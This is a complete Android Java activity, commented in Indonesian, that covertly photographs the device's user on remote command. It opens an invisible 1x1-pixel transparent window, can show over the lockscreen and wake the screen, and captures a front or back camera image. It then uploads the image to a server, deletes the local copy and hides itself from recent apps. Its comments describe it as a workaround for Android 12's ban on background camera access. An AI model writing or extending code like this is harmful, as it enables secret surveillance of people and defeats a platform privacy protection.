package com.example.app;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Activity transparan untuk mengambil foto kamera di Android 12+.
 *
 * Mulai Android 12 (API 31), sistem Android memblokir akses kamera
 * dari background service. Solusinya: buka Activity transparan yang
 * secara teknis berada di foreground, ambil foto, lalu tutup otomatis.
 *
 * Activity ini:
 * - Sepenuhnya transparan (tidak terlihat oleh pengguna)
 * - Ukuran 1x1 pixel, tanpa animasi masuk/keluar
 * - Otomatis menutup diri setelah foto diambil atau gagal
 * - Menggunakan flow yang sama dengan CameraService (CameraX → upload)
 *
 * Untuk Android di bawah 12, tetap gunakan CameraService (background).
 */
public class TransparentCameraActivity extends Activity implements LifecycleOwner {

    private static final String TAG = "TransparentCamera";
    private static final long CAPTURE_DELAY_MS = 800L;
    private static final long TIMEOUT_MS = 30_000L;

    public static final String EXTRA_REQUEST_ID = "requestId";
    public static final String EXTRA_CAMERA = "camera";

    private LifecycleRegistry lifecycleRegistry;
    private ImageCapture imageCapture;

    private String requestId;
    private String requestedCamera = "front";
    private boolean useFrontCamera = true;

    private final Handler timeoutHandler = new Handler(Looper.getMainLooper());

    // =========================================================
    // LIFECYCLE
    // =========================================================

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        lifecycleRegistry = new LifecycleRegistry(this);
        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);

        // Buat window transparan, tanpa animasi, ukuran minimal
        Window window = getWindow();
        if (window != null) {
            window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
            window.addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);

            // Tampilkan di atas lockscreen jika perlu
            window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
            window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

            // Ukuran minimal 1x1 pixel
            WindowManager.LayoutParams params = window.getAttributes();
            params.width = 1;
            params.height = 1;
            params.dimAmount = 0f;
            window.setAttributes(params);
        }

        // Hilangkan animasi buka/tutup
        overridePendingTransition(0, 0);

        // Baca extras dari intent
        Intent intent = getIntent();
        if (intent != null) {
            requestId = intent.getStringExtra(EXTRA_REQUEST_ID);
            String camera = intent.getStringExtra(EXTRA_CAMERA);
            if ("back".equalsIgnoreCase(camera)) {
                requestedCamera = "back";
                useFrontCamera = false;
            } else {
                requestedCamera = "front";
                useFrontCamera = true;
            }
        }

        Log.d(TAG, "TransparentCameraActivity dimulai"
                + " | requestId=" + requestId
                + " | camera=" + requestedCamera);

        // Timeout safety: tutup paksa setelah 30 detik
        timeoutHandler.postDelayed(() -> {
            Log.w(TAG, "Timeout! Menutup activity paksa.");
            cancelRequest();
        }, TIMEOUT_MS);

        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
        lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);

        // Mulai proses kamera
        startCameraAndCapture();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        timeoutHandler.removeCallbacksAndMessages(null);
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
    }

    @Override
    public void finish() {
        super.finish();
        // Hilangkan animasi tutup
        overridePendingTransition(0, 0);
    }

    @NonNull
    @Override
    public Lifecycle getLifecycle() {
        return lifecycleRegistry;
    }

    // =========================================================
    // KAMERA
    // =========================================================

    private void startCameraAndCapture() {

        // Kirim status RECEIVED ke server
        final String currentRequestId = requestId;
        if (currentRequestId != null && !currentRequestId.trim().isEmpty()) {
            new Thread(() ->
                    ApiHelper.updateCameraRequestStatus(
                            currentRequestId, "RECEIVED"
                    )
            ).start();
        }

        ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(this);

        future.addListener(() -> {

            try {
                ProcessCameraProvider cameraProvider = future.get();

                CameraSelector selector = useFrontCamera
                        ? CameraSelector.DEFAULT_FRONT_CAMERA
                        : CameraSelector.DEFAULT_BACK_CAMERA;

                if (!cameraProvider.hasCamera(selector)) {
                    Log.e(TAG, "Kamera " + requestedCamera + " tidak tersedia");
                    cancelRequest();
                    return;
                }

                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(
                                ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY
                        )
                        .build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(
                        this, selector, imageCapture
                );

                // Tunggu kamera stabil sebelum ambil foto
                new Handler(Looper.getMainLooper()).postDelayed(
                        this::takePhoto,
                        CAPTURE_DELAY_MS
                );

            } catch (Exception e) {
                Log.e(TAG, "Gagal membuka kamera", e);
                cancelRequest();
            }

        }, ContextCompat.getMainExecutor(this));
    }

    // =========================================================
    // AMBIL FOTO
    // =========================================================

    private void takePhoto() {

        if (imageCapture == null) {
            cancelRequest();
            return;
        }

        File outputDir = new File(getCacheDir(), "camera");
        if (!outputDir.exists() && !outputDir.mkdirs()) {
            Log.e(TAG, "Gagal membuat direktori cache kamera");
            cancelRequest();
            return;
        }

        String timestamp = new SimpleDateFormat(
                "yyyyMMdd_HHmmss_SSS", Locale.US
        ).format(new Date());

        File photoFile = new File(outputDir, "IMG_" + timestamp + ".jpg");

        ImageCapture.OutputFileOptions outputOptions =
                new ImageCapture.OutputFileOptions
                        .Builder(photoFile)
                        .build();

        imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageSavedCallback() {

                    @Override
                    public void onImageSaved(
                            @NonNull ImageCapture.OutputFileResults results) {
                        Log.d(TAG, "Foto tersimpan: " + photoFile.getName());
                        uploadPhoto(photoFile);
                    }

                    @Override
                    public void onError(
                            @NonNull ImageCaptureException exception) {
                        Log.e(TAG, "Gagal ambil foto", exception);
                        cancelRequest();
                    }
                }
        );
    }

    // =========================================================
    // UPLOAD & SELESAI
    // =========================================================

    private void uploadPhoto(File photo) {

        final String currentRequestId = requestId;
        final String currentCamera = requestedCamera;

        if (currentRequestId == null ||
                currentRequestId.trim().isEmpty()) {
            cleanupAndFinish(photo);
            return;
        }

        new Thread(() -> {

            boolean uploaded = ApiHelper.uploadCapturedPhoto(
                    currentRequestId,
                    currentCamera,
                    photo
            );

            ApiHelper.updateCameraRequestStatus(
                    currentRequestId,
                    uploaded ? "COMPLETED" : "UPLOAD_FAILED"
            );

            Log.d(TAG, uploaded ? "Upload berhasil" : "Upload gagal");

            // Harus jalankan finish() di main thread
            runOnUiThread(() -> cleanupAndFinish(photo));

        }).start();
    }

    // =========================================================
    // CANCEL & CLEANUP
    // =========================================================

    private void cancelRequest() {
        final String id = requestId;
        if (id != null && !id.trim().isEmpty()) {
            new Thread(() ->
                    ApiHelper.updateCameraRequestStatus(id, "CANCELLED")
            ).start();
        }
        finish();
    }

    private void cleanupAndFinish(File file) {
        if (file != null && file.exists()) {
            if (!file.delete()) file.deleteOnExit();
        }
        finish();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    /**
     * Mulai TransparentCameraActivity dari CameraPollingService
     * atau dari mana saja pada Android 12+.
     */
    public static void start(
            Context context,
            String requestId,
            String camera) {

        Intent intent = new Intent(context, TransparentCameraActivity.class);
        intent.putExtra(EXTRA_REQUEST_ID, requestId);
        intent.putExtra(EXTRA_CAMERA, camera);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        context.startActivity(intent);
    }
}
